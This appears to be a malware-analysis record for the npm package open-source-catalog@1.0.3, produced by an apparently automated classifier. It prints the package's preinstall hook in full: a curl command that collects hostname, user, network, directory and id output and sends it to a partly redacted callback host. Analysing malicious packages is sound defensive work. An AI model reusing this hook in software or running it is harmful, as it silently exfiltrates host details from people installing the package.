# npm open-source-catalog@1.0.3

**Source:** datadog · **Source label:** malicious · **Released:** 2025-07-06 (registry) · **Assessment:** malicious (high) · **Analysis:** ai (claude-opus-5-5)

## Summary

The package holds only `package.json`. Its `preinstall` hook runs one inline shell command on every registry install: `/usr/bin/curl --data-urlencode` with the output of `hostname`, `whoami`, `ifconfig`, `pwd` and `id`, sent to an OAST callback host (sd96…[.]oastify[.]com). There are no gates; the recon and exfil run unconditionally. It needs a POSIX shell (Linux or macOS), curl at /usr/bin/curl and outbound HTTP to the callback host.

## Execution

- **preinstall** `/usr/bin/curl --data-urlencode "info=$(hostname && whoami && ifconfig && pwd && id)" sd96…[.]oastify[.]com`: no package files; inline_shell.

## Gates

None.

## Requirements

- network: sd96…[.]oastify[.]com:80 (curl POSTs the collected info over plain HTTP (no scheme given))
- installed_tool: curl (hook calls /usr/bin/curl by absolute path)
- installed_tool: ifconfig (needed for the full && chain; without it the ifconfig, pwd and id output is lost)
- os: linux (POSIX sh command substitution and /usr/bin/curl; the hook fails under cmd.exe on Windows (darwin would also work))

## Behaviour

- Ungated: recon, exfil
- Gated: none

## Notes

- The prefilled launch style `download_then_exec` was wrong and is replaced by `inline_shell`; nothing is downloaded or executed.
- `attack_type: dependency_confusion` comes from the code pattern (an unconditional hostname/user callback to an OAST host from a generic, internal-sounding name). The manifest description says the same thing, but it is package text, so the label does not rely on it.
- The OAST subdomain is redacted to its first 4 characters.

## Record

```json
{
  "schema_version": "3.2",
  "record_type": "analysed",
  "package": {
    "ecosystem": "npm",
    "name": "open-source-catalog",
    "version": "1.0.3",
    "archive_sha256": "96d1a1e8f46a41cf384b208d3824875ec0474b719b349b02a04b1adb51fe5002",
    "source_dataset": "datadog",
    "source_label": "malicious",
    "released_at": "2025-07-06",
    "released_at_source": "registry",
    "sample_path": "datadog/npm/malicious_intent/2025-07-06-open-source-catalog-v1.0.3.zip",
    "package_root": "layer0/tmp/tmpkq3sx6wp/open-source-catalog/package",
    "cluster_key": "9d99384a2b7274c200e9f2ac60530d7c5874982d1954fd79f01de5d147886b76",
    "analysis_type": "ai",
    "model_name": "claude-opus-5-5"
  },
  "execution": {
    "entry_points": [
      {
        "hook": "preinstall",
        "command": "/usr/bin/curl --data-urlencode \"info=$(hostname && whoami && ifconfig && pwd && id)\" sd96…[.]oastify[.]com",
        "runs_on": "always",
        "file_chain": [],
        "interpreter": "sh",
        "launch_style": [
          "inline_shell"
        ],
        "silent_failure": false
      }
    ],
    "delays": [],
    "notes": [
      "package.json is the only file in the package; main index.js does not exist. The preinstall hook is one inline curl command with no shell conditionals, so there are no gates.",
      "Command substitution runs hostname, whoami, ifconfig, pwd and id joined with &&; a missing tool cuts the collected text short, but curl still runs.",
      "Prefilled launch_style download_then_exec replaced by inline_shell: curl only POSTs collected data, nothing is fetched and executed.",
      "The endpoint is an OAST (Burp Collaborator style) subdomain, redacted to its first 4 characters as an access id."
    ]
  },
  "requirements": [
    {
      "axis": "network",
      "value": "sd96…[.]oastify[.]com:80",
      "reason": "curl POSTs the collected info over plain HTTP (no scheme given)"
    },
    {
      "axis": "installed_tool",
      "value": "curl",
      "reason": "hook calls /usr/bin/curl by absolute path"
    },
    {
      "axis": "installed_tool",
      "value": "ifconfig",
      "reason": "needed for the full && chain; without it the ifconfig, pwd and id output is lost"
    },
    {
      "axis": "os",
      "value": "linux",
      "reason": "POSIX sh command substitution and /usr/bin/curl; the hook fails under cmd.exe on Windows (darwin would also work)"
    }
  ],
  "conditions": [],
  "gates": [],
  "behaviours": {
    "ungated": [
      "recon",
      "exfil"
    ],
    "gated": []
  },
  "obfuscation": {
    "level": "none",
    "techniques": [],
    "decoded": null,
    "unrecovered": []
  },
  "reachability": {
    "needs_remote": true,
    "endpoints": [
      {
        "indicator": "sd96…[.]oastify[.]com",
        "role": "exfil_sink"
      }
    ]
  },
  "attack_type": "dependency_confusion",
  "family_hint": null,
  "claude_assessment": "malicious",
  "assessment_reason": "The preinstall hook unconditionally collects hostname, user name, network interface configuration, working directory and id output and sends it to an OAST callback host with curl. This is the usual dependency-confusion callback pattern and exfiltrates host details from every Linux or macOS machine that installs it.",
  "label_disagreement": false,
  "confidence": "high",
  "needs_manual_review": false,
  "review_reasons": [],
  "normalisation": {
    "derivations": [],
    "candidate_set": {
      "generator": "gate_extract@88c7907d65",
      "sha256": "428960f5b8cf6c20"
    },
    "units_summary": [],
    "truncation": {
      "walk_limit": false,
      "context_limited_files": 0
    }
  },
  "candidate_review": {
    "dropped": []
  },
  "candidate_check": {
    "condition_candidates": 0,
    "condition_sites_cited": 0,
    "guards_cited": 0,
    "candidates_dropped": 0,
    "conditions_in_set": 0,
    "conditions_out_of_set": 0,
    "guard_candidates": 0,
    "gates_in_set": 0,
    "gates_out_of_set": 0,
    "out_of_set_ids": [],
    "anchor_refusals": 0
  }
}
```
